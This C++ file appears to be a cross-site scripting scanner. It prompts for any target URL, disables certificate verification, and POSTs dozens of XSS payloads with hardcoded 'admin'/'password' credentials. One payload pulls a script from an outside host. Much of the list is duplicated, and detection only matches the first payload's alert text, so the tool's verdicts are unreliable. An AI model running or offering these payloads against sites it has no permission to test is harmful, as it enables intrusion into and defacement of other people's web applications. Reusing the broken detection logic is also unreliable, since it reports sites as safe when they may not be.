#include <iostream>
#include <string>
#include <vector>
#include <curl/curl.h>

// ANSI escape codes for color formatting
#define RED_TEXT "\033[1;31m"
#define GREEN_TEXT "\033[1;32m"
#define RESET_TEXT "\033[0m"

// Callback function to handle response
size_t curlWriteCallback(void* contents, size_t size, size_t nmemb, std::string* buffer) {
    buffer->append((char*)contents, size * nmemb);
    return size * nmemb;
}

// Function to perform XSS vulnerability testing with multiple payloads
void testXSS(const std::string& url) {
    // List of XSS payloads to test
    std::vector<std::string> payloads = {
        "<script>alert('XSS Vulnerability Found!');</script>",
        "<IMG SRC=j&#X41vascript:alert('XSS');>",
        "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
        "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
        "<BODY ONLOAD=alert('XSS')>",
        "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
        "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>",
        "<IMG SRC=# onmouseover=\"alert('XSS')\">",
        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
        "<IMG SRC=javascript:alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<svg><script>alert('XSS')</script></svg>",
        "<svg><script>alert(String.fromCharCode(88,83,83))</script></svg>",
        "<svg><script>alert(String.fromCharCode(88,88,83,83))</script></svg>",
        "<svg><script>x='as';y='s';alert(x+y)</script></svg>",
        "<svg><script>x='as';y='s';alert(y+x)</script></svg>",
        "<svg><script>alert('foo')</script></svg>",
        "<svg><script>alert('XSS');</script></svg>",
        "<svg><script>alert(/XSS/)</script></svg>",
        "<svg><script>alert('XSS')</script></svg>",
        "<svg><script>alert(/XSS/)</script></svg>",
        "<svg><script>prompt('XSS')</script></svg>",
        "<svg><script>confirm('XSS')</script></svg>",
        "<svg><script>prompt(String.fromCharCode(88,83,83))</script></svg>",
        "<svg><script>confirm(String.fromCharCode(88,83,83))</script></svg>",
        "<svg><script>alert(String.fromCharCode(88,83,83))</script></svg>",
        "<img src=x onerror=alert('XSS')>",
        "<img src=x onerror=alert('XSS') />",
        "<img src=x onerror=alert(1) y=1>",
        "<img src=x onerror=alert(1) y=1 />",
        "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
        "<IMG SRC=# onmouseover=\"alert('XSS')\">",
        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
        "<IMG SRC=javascript:alert('XSS')>",
        "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
        "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
        "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
        "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>",
        "<IMG SRC=javascript:alert(&quot;XSS&quot;)>",
        "<IMG SRC=JaVaScRiPt:alert('XSS')>",
        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
        "<IMG SRC=javascript:alert('XSS')>",
        "<IMG SRC=javascript:alert('XSS')>",
        "<IMG SRC=javascript:alert('XSS')>",
        "<IMG SRC=javascript:alert(String.fromCharCode(88,88,83,83))>",
        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
        // Add more payloads here
    };

    // Initialize libcurl
    curl_global_init(CURL_GLOBAL_ALL);
    CURL* curl = curl_easy_init();

    if (curl) {
        // Response buffer
        std::string response;

        // Set common libcurl options
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curlWriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L); // Ignore SSL certificate verification

        // Loop through each payload and test for XSS vulnerability
        for (const auto& payload : payloads) {
            // Constructing the POST request body with the XSS payload
            std::string postBody = "username=admin&password=password&comment=" + payload;

            // Set URL and request type
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_POST, 1L);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postBody.c_str());

            // Perform the request
            curl_easy_perform(curl);

            // Check if the response contains any indicators of XSS vulnerability
            if (response.find("XSS Vulnerability Found!") != std::string::npos) {
                std::cout << RED_TEXT << "XSS Vulnerability Detected with payload: " << payload << RESET_TEXT << std::endl;
            } else {
                std::cout << GREEN_TEXT << "No XSS Vulnerability Detected with payload: " << payload << RESET_TEXT << std::endl;
            }

            // Clear response buffer for the next request
            response.clear();
        }

        // Cleanup libcurl
        curl_easy_cleanup(curl);
    }

    // Cleanup libcurl
    curl_global_cleanup();
}

int main() {
    // Prompt user for target website URL
    std::cout << "Enter your target website URL: ";
    std::string url;
    std::getline(std::cin, url);

    // Perform XSS vulnerability testing
    testXSS(url);

    return 0;
}
